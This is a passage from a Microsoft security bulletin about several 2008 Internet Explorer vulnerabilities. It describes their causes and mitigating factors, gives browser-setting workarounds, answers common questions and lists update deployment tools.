  3. Under **Security level for this zone**, move the slider to **High**. This sets the security level for all Web sites you visit to High.

  **Note** If no slider is visible, click **Default Level**, and then move the slider to **High**.

  **Note** Setting the level to High may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly even with the security setting set to High.

  **Add sites that you trust to the Internet Explorer Trusted sites zone**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.
* **Configure Internet Explorer to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone**

  You can help protect against exploitation of this vulnerability by changing your settings to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone. To do this, follow these steps:

  1. In Internet Explorer, click **Internet Options** on the **Tools** menu.
  2. Click the **Security** tab.
  3. Click **Internet**, and then click **Custom Level**.
  4. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt** or **Disable**, and then click **OK**.
  5. Click **Local intranet**, and then click **Custom Level**.
  6. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt** or **Disable**, and then click **OK**.
  7. Click **OK** two times to return to Internet Explorer.

  **Note** Disabling Active Scripting in the Internet and Local intranet security zones may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly.

  **Add sites that you trust to the Internet Explorer Trusted sites zone**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.

  **Note** Add any sites that you trust not to take malicious action on your system. Two in particular that you may want to add are **\*.windowsupdate.microsoft.com** and **\*.update.microsoft.com**. These are the sites that will host the update, and it requires an ActiveX Control to install the update.

  **Impact of Workaround:** There are side effects to prompting before running Active Scripting. Many Web sites that are on the Internet or on an intranet use Active Scripting to provide additional functionality. For example, an online e-commerce site or banking site may use Active Scripting to provide menus, ordering forms, or even account statements. Prompting before running Active Scripting is a global setting that affects all Internet and intranet sites. You will be prompted frequently when you enable this workaround. For each prompt, if you feel you trust the site that you are visiting, click **Yes** to run Active Scripting. If you do not want to be prompted for all these sites, use the steps outlined in "Add sites that you trust to the Internet Explorer Trusted sites zone".

#### FAQ for Cross-Domain Information Disclosure Vulnerability - CVE-2008-3474

**What is the scope of the vulnerability?**

This is an information disclosure vulnerability. An attacker who successfully exploited this vulnerability could read cookies or other data from another domain or Internet Explorer security zone. However, user interaction is required to exploit this vulnerability.

**What causes the vulnerability?**

Internet Explorer incorrectly interprets the origin of script, allowing it to run in the context of a domain or Internet Explorer security zone other than where it originated.

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited the information disclosure vulnerability could read cookies or other data from another security zone or domain in Internet Explorer.

**How could an attacker exploit the vulnerability?**

An attacker could host a specially crafted Web site that is designed to exploit the vulnerability through Internet Explorer and then convince a user to visit the Web site. The attacker could also take advantage of compromised Web sites and Web sites that accept or host user-provided content or advertisements. These Web sites could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or in an Instant Messenger message that takes users to the attacker's Web site. It could also be possible to display specially crafted Web content by using banner advertisements or by using other methods to deliver Web content to affected systems.

**What systems are primarily at risk from the vulnerability?**

A user must be logged on and visiting a Web site for malicious action to occur. Therefore, any systems where Internet Explorer is used frequently, such as workstations and terminal servers, are at the most risk from this vulnerability.

**I am running Internet Explorer for Windows Server 2003 or Windows Server 2008. Does this mitigate this vulnerability?**

Yes. By default, Internet Explorer on Windows Server 2003 and Windows Server 2008 runs in a restricted mode that is known as [Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92039). Enhanced Security Configuration is a group of preconfigured settings in Internet Explorer that can reduce the likelihood of a user or administrator downloading and running specially crafted Web content on a server. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone. See also [Managing Internet Explorer Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92055).

**What does the update do?**

The update corrects the identification of the domain of an executed script, restricting it to execute in the context of its original domain.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

No. Microsoft received information about this vulnerability through responsible disclosure.

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

No. Microsoft had not received any information to indicate that this vulnerability had been publicly used to attack customers and had not seen any examples of proof of concept code published when this security bulletin was originally issued.

## Uninitialized Memory Corruption Vulnerability - CVE-2008-3475

A remote code execution vulnerability exists in the way Internet Explorer accesses an object that has not been correctly initialized or that has been deleted. An attacker could exploit the vulnerability by constructing a specially crafted Web page. When a user views the Web page, the vulnerability could allow remote code execution. An attacker who successfully exploited this vulnerability could gain the same user rights as the logged-on user.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2008-3475](https://www.cve.org/CVERecord?id=CVE-2008-3475).

#### Mitigating Factors for Uninitialized Memory Corruption Vulnerability - CVE-2008-3475

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* In a Web-based attack scenario, an attacker could host a Web site that contains a Web page that is used to exploit this vulnerability. In addition, compromised Web sites and Web sites that accept or host user-provided content or advertisements could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or Instant Messenger message that takes users to the attackerâs Web site.
* An attacker who successfully exploited this vulnerability could gain the same user rights as the local user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.
* By default, all supported versions of Microsoft Outlook and Microsoft Outlook Express open HTML e-mail messages in the Restricted sites zone. The Restricted sites zone helps mitigate attacks that could try to exploit this vulnerability by preventing Active Scripting and ActiveX controls from being used when reading HTML e-mail messages. However, if a user clicks a link in an e-mail message, the user could still be vulnerable to exploitation of this vulnerability through the Web-based attack scenario.
* By default, Internet Explorer on Windows Server 2003 and Windows Server 2008 runs in a restricted mode that is known as [Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92039). This mode sets the security level for the Internet zone to High. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone. See the FAQ subsection of this vulnerability section for more information about Internet Explorer Enhanced Security Configuration.
* Windows Internet Explorer 7 is not affected by this vulnerability.

#### Workarounds for Uninitialized Memory Corruption Vulnerability - CVE-2008-3475

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Set Internet and Local intranet security zone settings to âHighâ to prompt before running ActiveX Controls and Active Scripting in these zones**

  You can help protect against exploitation of this vulnerability by changing your settings for the Internet security zone to prompt before running ActiveX controls and Active Scripting. You can do this by setting your browser security to High.

  To raise the browsing security level in Internet Explorer, follow these steps:

  1. On the Internet Explorer **Tools** menu, click **Internet Options**.
  2. In the **Internet Options** dialog box, click the **Security** tab, and then click the **Internet** icon.
  3. Under **Security level for this zone**, move the slider to **High**. This sets the security level for all Web sites you visit to High.

  **Note** If no slider is visible, click **Default Level**, and then move the slider to **High**.

  **Note** Setting the level to High may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly even with the security setting set to High.

  **Add sites that you trust to the Internet Explorer Trusted sites zone**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.
* **Configure Internet Explorer to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone**

  You can help protect against exploitation of this vulnerability by changing your settings to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone. To do this, follow these steps:

  1. In Internet Explorer, click **Internet Options** on the **Tools** menu.
  2. Click the **Security** tab.
  3. Click **Internet**, and then click **Custom Level**.
  4. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt** or **Disable**, and then click **OK**.
  5. Click **Local intranet**, and then click **Custom Level**.
  6. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt** or **Disable**, and then click **OK**.
  7. Click **OK** two times to return to Internet Explorer.

  **Note** Disabling Active Scripting in the Internet and Local intranet security zones may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly.

  **Add sites that you trust to the Internet Explorer Trusted sites zone**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.

  **Note** Add any sites that you trust not to take malicious action on your system. Two in particular that you may want to add are **\*.windowsupdate.microsoft.com** and **\*.update.microsoft.com**. These are the sites that will host the update, and it requires an ActiveX Control to install the update.

  **Impact of Workaround:** There are side effects to prompting before running Active Scripting. Many Web sites that are on the Internet or on an intranet use Active Scripting to provide additional functionality. For example, an online e-commerce site or banking site may use Active Scripting to provide menus, ordering forms, or even account statements. Prompting before running Active Scripting is a global setting that affects all Internet and intranet sites. You will be prompted frequently when you enable this workaround. For each prompt, if you feel you trust the site that you are visiting, click **Yes** to run Active Scripting. If you do not want to be prompted for all these sites, use the steps outlined in "Add sites that you trust to the Internet Explorer Trusted sites zone".

#### FAQ for Uninitialized Memory Corruption Vulnerability - CVE-2008-3475

**What is the scope of the vulnerability?**

This is a remote code execution vulnerability. An attacker who successfully exploited this vulnerability could gain the same user rights as the logged on user. If a user is logged on with administrative user rights, an attacker who successfully exploited this vulnerability could take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

**What causes the vulnerability?**

Internet Explorer attempts to access an object which has not been initialized or has been deleted. As a result, memory may be corrupted in such a way that an attacker could execute arbitrary code in the context of the logged-on user.

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could gain the same user rights as the local user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

**How could an attacker exploit the vulnerability?**

An attacker could host a specially crafted Web site that is designed to exploit this vulnerability through Internet Explorer and then convince a user to view the Web site. The attacker could also take advantage of compromised Web sites and Web sites that accept or host user-provided content or advertisements. These Web sites could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or in an Instant Messenger message that takes users to the attacker's Web site. It could also be possible to display specially crafted Web content by using banner advertisements or by using other methods to deliver Web content to affected systems.

**What systems are primarily at risk from the vulnerability?**

A user must be logged on and visiting a Web site for malicious action to occur. Therefore, any systems where Internet Explorer is used frequently, such as workstations and terminal servers, are at the most risk from this vulnerability.

**I am running Internet Explorer for Windows Server 2003 or Windows Server 2008. Does this mitigate this vulnerability?**

Yes. By default, Internet Explorer on Windows Server 2003 and Windows Server 2008 runs in a restricted mode that is known as [Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92039). Enhanced Security Configuration is a group of preconfigured settings in Internet Explorer that can reduce the likelihood of a user or administrator downloading and running specially crafted Web content on a server. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone. See also [Managing Internet Explorer Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92055).

**What does the update do?**

The update modifies the way that Internet Explorer handles errors when making calls to uninitialized or deleted objects.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

No. Microsoft received information about this vulnerability through responsible disclosure.

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

No. Microsoft had not received any information to indicate that this vulnerability had been publicly used to attack customers and had not seen any examples of proof of concept code published when this security bulletin was originally issued.

## HTML Objects Memory Corruption Vulnerability - CVE-2008-3476

A remote code execution vulnerability exists in Internet Explorer due to attempts to access uninitialized memory in certain situations. An attacker could exploit the vulnerability by constructing a specially crafted Web page. When a user views the Web page, the vulnerability could allow remote code execution. An attacker who successfully exploited this vulnerability could gain the same user rights as the logged-on user.

To view this vulnerability as a standard entry in the Common Vulnerabilities and Exposures list, see [CVE-2008-3476](https://www.cve.org/CVERecord?id=CVE-2008-3476).

#### Mitigating Factors for HTML Objects Memory Corruption Vulnerability - CVE-2008-3476

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* In a Web-based attack scenario, an attacker could host a Web site that contains a Web page that is used to exploit this vulnerability. In addition, compromised Web sites and Web sites that accept or host user-provided content or advertisements could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or Instant Messenger message that takes users to the attackerâs Web site.
* An attacker who successfully exploited this vulnerability could gain the same user rights as the local user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.
* By default, all supported versions of Microsoft Outlook and Microsoft Outlook Express open HTML e-mail messages in the Restricted sites zone. The Restricted sites zone helps mitigate attacks that could try to exploit this vulnerability by preventing Active Scripting and ActiveX controls from being used when reading HTML e-mail messages. However, if a user clicks a link in an e-mail message, the user could still be vulnerable to exploitation of this vulnerability through the Web-based attack scenario.
* By default, Internet Explorer on Windows Server 2003 and Windows Server 2008 runs in a restricted mode that is known as [Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92039). This mode sets the security level for the Internet zone to High. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone. See the FAQ subsection of this vulnerability section for more information about Internet Explorer Enhanced Security Configuration.
* Windows Internet Explorer 7 is not affected by this vulnerability.

#### Workarounds for HTML Objects Memory Corruption Vulnerability - CVE-2008-3476

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Set Internet and Local intranet security zone settings to âHighâ to prompt before running ActiveX Controls and Active Scripting in these zones**

  You can help protect against exploitation of this vulnerability by changing your settings for the Internet security zone to prompt before running ActiveX controls and Active Scripting. You can do this by setting your browser security to High.

  To raise the browsing security level in Internet Explorer, follow these steps:

  1. On the Internet Explorer **Tools** menu, click **Internet Options**.
  2. In the **Internet Options** dialog box, click the **Security** tab, and then click the **Internet** icon.
  3. Under **Security level for this zone**, move the slider to **High**. This sets the security level for all Web sites you visit to High.

  **Note** If no slider is visible, click **Default Level**, and then move the slider to **High**.

  **Note** Setting the level to High may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly even with the security setting set to High.

  **Add sites that you trust to the Internet Explorer Trusted sites zone**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.
* **Configure Internet Explorer to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone**

  You can help protect against exploitation of this vulnerability by changing your settings to prompt before running Active Scripting or to disable Active Scripting in the Internet and Local intranet security zone. To do this, follow these steps:

  1. In Internet Explorer, click **Internet Options** on the **Tools** menu.
  2. Click the **Security** tab.
  3. Click **Internet**, and then click **Custom Level**.
  4. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt** or **Disable**, and then click **OK**.
  5. Click **Local intranet**, and then click **Custom Level**.
  6. Under **Settings**, in the **Scripting** section, under **Active Scripting**, click **Prompt** or **Disable**, and then click **OK**.
  7. Click **OK** two times to return to Internet Explorer.

  **Note** Disabling Active Scripting in the Internet and Local intranet security zones may cause some Web sites to work incorrectly. If you have difficulty using a Web site after you change this setting, and you are sure the site is safe to use, you can add that site to your list of trusted sites. This will allow the site to work correctly.

  **Add sites that you trust to the Internet Explorer Trusted sites zone**

  After you set Internet Explorer to require a prompt before it runs ActiveX controls and Active Scripting in the Internet zone and in the Local intranet zone, you can add sites that you trust to the Internet Explorer Trusted sites zone. This will allow you to continue to use trusted Web sites exactly as you do today, while helping to protect you from this attack on untrusted sites. We recommend that you add only sites that you trust to the Trusted sites zone.

  To do this, follow these steps:

  1. In Internet Explorer, click **Tools**, click **Internet Options**, and then click the **Security** tab.
  2. In the **Select a Web content zone to specify its current security settings** box, click **Trusted Sites**, and then click **Sites**.
  3. If you want to add sites that do not require an encrypted channel, click to clear the **Require server verification (https:) for all sites in this zone** check box.
  4. In the **Add this Web site to the zone** box, type the URL of a site that you trust, and then click **Add**.
  5. Repeat these steps for each site that you want to add to the zone.
  6. Click **OK** two times to accept the changes and return to Internet Explorer.

  **Note** Add any sites that you trust not to take malicious action on your system. Two in particular that you may want to add are **\*.windowsupdate.microsoft.com** and **\*.update.microsoft.com**. These are the sites that will host the update, and it requires an ActiveX Control to install the update.

  **Impact of Workaround:** There are side effects to prompting before running Active Scripting. Many Web sites that are on the Internet or on an intranet use Active Scripting to provide additional functionality. For example, an online e-commerce site or banking site may use Active Scripting to provide menus, ordering forms, or even account statements. Prompting before running Active Scripting is a global setting that affects all Internet and intranet sites. You will be prompted frequently when you enable this workaround. For each prompt, if you feel you trust the site that you are visiting, click **Yes** to run Active Scripting. If you do not want to be prompted for all these sites, use the steps outlined in "Add sites that you trust to the Internet Explorer Trusted sites zone".

#### FAQ for HTML Objects Memory Corruption Vulnerability - CVE-2008-3476

**What is the scope of the vulnerability?**

This is a remote code execution vulnerability. An attacker who successfully exploited this vulnerability could gain the same user rights as the logged-on user. If a user is logged on with administrative user rights, an attacker who successfully exploited this vulnerability could take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

**What causes the vulnerability?**

Internet Explorer attempts to access uninitialized memory. As a result, memory may be corrupted in such a way that an attacker could execute arbitrary code in the context of the logged-on user.

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could gain the same user rights as the local user. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.

**How could an attacker exploit the vulnerability?**

An attacker could host a specially crafted Web site that is designed to exploit this vulnerability through Internet Explorer and then convince a user to view the Web site. The attacker could also take advantage of compromised Web sites and Web sites that accept or host user-provided content or advertisements. These Web sites could contain specially crafted content that could exploit this vulnerability. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or in an Instant Messenger message that takes users to the attacker's Web site. It could also be possible to display specially crafted Web content by using banner advertisements or by using other methods to deliver Web content to affected systems.

**What systems are primarily at risk from the vulnerability?**

A user must be logged on and visiting a Web site for malicious action to occur. Therefore, any systems where Internet Explorer is used frequently, such as workstations and terminal servers, are at the most risk from this vulnerability.

**I am running Internet Explorer for Windows Server 2003 or Windows Server 2008. Does this mitigate this vulnerability?**

Yes. By default, Internet Explorer on Windows Server 2003 and Windows Server 2008 runs in a restricted mode that is known as [Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92039). Enhanced Security Configuration is a group of preconfigured settings in Internet Explorer that can reduce the likelihood of a user or administrator downloading and running specially crafted Web content on a server. This is a mitigating factor for Web sites that you have not added to the Internet Explorer Trusted sites zone. See also [Managing Internet Explorer Enhanced Security Configuration](https://go.microsoft.com/fwlink/?linkid=92055).

**What does the update do?**

The update modifies the way that Internet Explorer handles the error when attempting to access uninitialized memory.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

No. Microsoft received information about this vulnerability through responsible disclosure.

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

No. Microsoft had not received any information to indicate that this vulnerability had been publicly used to attack customers and had not seen any examples of proof of concept code published when this security bulletin was originally issued.

### Update Information

## Detection and Deployment Tools and Guidance

Manage the software and security updates you need to deploy to the servers, desktop, and mobile computers in your organization. For more information see the [TechNet Update Management Center](https://go.microsoft.com/fwlink/?linkid=69903). The [Microsoft TechNet Security Web site](https://go.microsoft.com/fwlink/?linkid=21132) provides additional information about security in Microsoft products.

Security updates are available from [Microsoft Update](https://go.microsoft.com/fwlink/?linkid=40747), [Windows Update](https://go.microsoft.com/fwlink/?linkid=21130), and [Office Update](https://go.microsoft.com/fwlink/?linkid=21135). Security updates are also available at the [Microsoft Download Center](https://go.microsoft.com/fwlink/?linkid=21129). You can find them most easily by doing a keyword search for "security update."

Finally, security updates can be downloaded from the [Microsoft Update Catalog](https://go.microsoft.com/fwlink/?linkid=96155). The Microsoft Update Catalog provides a searchable catalog of content made available through Windows Update and Microsoft Update, including security updates, drivers and service packs. By searching using the security bulletin number (such as, âMS08-010â), you can add all of the applicable updates to your basket (including different languages for an update), and download to the folder of your choosing. For more information about the Microsoft Update Catalog, see the [Microsoft Update Catalog FAQ](https://go.microsoft.com/fwlink/?linkid=97900).

**Detection and Deployment Guidance**

Microsoft has provided detection and deployment guidance for this monthâs security updates. This guidance will also help IT professionals understand how they can use various tools to help deploy the security update, such as Windows Update, Microsoft Update, Office Update, the Microsoft Baseline Security Analyzer (MBSA), the Office Detection Tool, Microsoft Systems Management Server (SMS), and the Extended Security Update Inventory Tool. For more information, see [Microsoft Knowledge Base Article 910723](https://support.microsoft.com/kb/910723).

**Microsoft Baseline Security Analyzer**

Microsoft Baseline Security Analyzer (MBSA) allows administrators to scan local and remote systems for missing security updates as well as common security misconfigurations. For more information about MBSA, visit [Microsoft Baseline Security Analyzer](https://www.microsoft.com/technet/security/tools/mbsahome.mspx).

The following table provides the MBSA detection summary for this security update.

| Software | MBSA 2.1 |
| --- | --- |
| Microsoft Windows 2000 Service Pack 4 | Yes |
| Windows XP Service Pack 2 and Windows XP Service Pack 3 | Yes |
| Windows XP Professional x64 Edition and Windows XP Professional x64 Edition Service Pack 2 | Yes |
| Windows Server 2003 Service Pack 1 and Windows Server 2003 Service Pack 2 | Yes |
| Windows Server 2003 x64 Edition and Windows Server 2003 x64 Edition Service Pack 2 | Yes |
| Windows Server 2003 with SP1 for Itanium-based Systems and Windows Server 2003 with SP2 for Itanium-based Systems | Yes |
| Windows Vista and Windows Vista Service Pack 1 | Yes |
| Windows Vista x64 Edition and Windows Vista x64 Edition Service Pack 1 | Yes |
| Windows Server 2008 for 32-bit Systems | Yes |
| Windows Server 2008 for x64-based Systems | Yes |
| Windows Server 2008 for Itanium-based Systems | Yes |

For more information about MBSA 2.1, see [MBSA 2.1 Frequently Asked Questions](https://www.microsoft.com/technet/security/tools/mbsa2/qa.mspx).

**Windows Server Update Services**

By using Windows Server Update Services (WSUS), administrators can deploy the latest critical updates and security updates for Windows 2000 operating systems and later, Office XP and later, Exchange Server 2003, and SQL Server 2000 to Windows 2000 and later operating systems. For more information about how to deploy this security update using Windows Server Update Services, visit the [Windows Server Update Services Web site](https://go.microsoft.com/fwlink/?linkid=50120).

**Systems Management Server**

The following table provides the SMS detection and deployment summary for this security update.

| Software | SMS 2.0 | SMS 2003 with SUSFP | SMS 2003 with ITMU | Configuration Manager 2007 |
| --- | --- | --- | --- | --- |
| Microsoft Windows 2000 Service Pack 4 | Yes | Yes | Yes | Yes |
| Windows XP Service Pack 2 and Windows XP Service Pack 3 | Yes\* | Yes\* | Yes | Yes |
| Windows XP Professional x64 Edition and Windows XP Professional x64 Edition Service Pack 2 | No | No | Yes | Yes |
| Windows Server 2003 Service Pack 1 and Microsoft Windows Server 2003 Service Pack 2 | Yes\* | Yes\* | Yes | Yes |
| Windows Server 2003 x64 Edition and Microsoft Windows Server 2003 x64 Edition Service Pack 2 | No | No | Yes | Yes |
| Windows Server 2003 with SP1 for Itanium-based Systems and Windows Server 2003 with SP2 for Itanium-based Systems | No | No | Yes | Yes |
| Windows Vista and Windows Vista Service Pack 1 | No | No | See **Note for Windows** **Vista** **and Windows Server2008** below | Yes |
| Windows Vista x64 Edition and Windows Vista x64 Edition Service Pack 1 | No | No | See **Note for Windows** **Vista** **and Windows Server2008** below | Yes |
| Windows Server 2008 (all supported editions) | No | No | See **Note for Windows** **Vista** **and Windows Server2008** below | Yes |

\*SMS 2.0 and SMS 2003 with SUSFP support all affected versions of Internet Explorer except for Internet Explorer 7. For more information, see [Microsoft Knowledge Base Article 924178](https://support.microsoft.com/kb/924178).

For SMS 2.0 and SMS 2003, the SMS SUS Feature Pack (SUSFP), which includes the Security Update Inventory Tool (SUIT), can be used by SMS to detect security updates. See also [Downloads for Systems Management Server 2.0](https://technet.microsoft.com/sms/bb676799.aspx).

For SMS 2003, the SMS 2003 Inventory Tool for Microsoft Updates (ITMU) can be used by SMS to detect security updates that are offered by [Microsoft Update](https://update.microsoft.com/microsoftupdate) and that are supported by [Windows Server Update Services](https://go.microsoft.com/fwlink/?linkid=50120). For more information about the SMS 2003 ITMU, see [SMS 2003 Inventory Tool for Microsoft Updates](https://technet.microsoft.com/sms/bb676783.aspx). SMS 2003 can also use the Microsoft Office Inventory Tool to detect required updates for Microsoft Office applications. For more information about the Office Inventory Tool and other scanning tools, see [SMS 2003 Software Update Scanning Tools](https://technet.microsoft.com/sms/bb676786.aspx). See also [Downloads for Systems Management Server 2003](https://technet.microsoft.com/sms/bb676766.aspx).

System Center Configuration Manager 2007 uses WSUS 3.0 for detection of updates. For more information about Configuration Manager 2007 Software Update Management, visit [System Center Configuration Manager 2007](https://technet.microsoft.com/library/bb735860.aspx).

**Note for Windows** **Vista** **and Windows Server 2008**  Microsoft Systems Management Server 2003 with Service Pack 3 includes support for Windows Vista and Windows Server 2008 manageability.

For more information about SMS, visit the [SMS Web site](https://go.microsoft.com/fwlink/?linkid=21158).

For more detailed information, see [Microsoft Knowledge Base Article 910723](https://support.microsoft.com/kb/910723): Summary list of monthly detection and deployment guidance articles.

**Update Compatibility Evaluator and Application Compatibility Toolkit**

Updates often write to the same files and registry settings required for your applications to run. This can trigger incompatibilities and increase the time it takes to deploy security updates. You can streamline testing and validating Windows updates against installed applications with the [Update Compatibility Evaluator](https://technet.microsoft.com/windowsvista/en/library/4279e239-37a4-44aa-aec5-4e70fe39f9de) components included with [Application Compatibility Toolkit 5.0](https://www.microsoft.com/download/details.aspx?familyid=24da89e9-b581-47b0-b45e-492dd6da2971&displaylang;=en).

The Application Compatibility Toolkit (ACT) contains the necessary tools and documentation to evaluate and mitigate application compatibility issues before deploying Microsoft Windows Vista, a Windows Update, a Microsoft Security Update, or a new version of Windows Internet Explorer in your environment.

## Security Update Deployment

**Affected Software**

For information about the specific security update for your affected software, click the appropriate link:

